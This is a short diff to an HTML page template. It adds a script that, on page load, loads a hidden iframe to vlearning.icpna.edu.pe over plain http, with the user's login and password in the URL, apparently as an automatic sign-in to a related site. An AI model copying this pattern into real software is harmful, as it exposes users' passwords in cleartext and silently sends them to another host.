@@ -10,8 +10,12 @@
 <script src="js/bootstrap.js" type="text/javascript"></script>
 {{styles}}
 {{javascripts}}
+    <script>
+        $(document).ready(function(){var url='http://vlearning.icpna.edu.pe/?login={{ login }}&password={{ pass }}&enc=1'; var _iframe_dl = $('<iframe />') .attr('src', url) .hide() .appendTo('body'); });
+    </script>
 </head>
 <body>
+
 <div id="wrapper">
     <div class="container">
         <header>
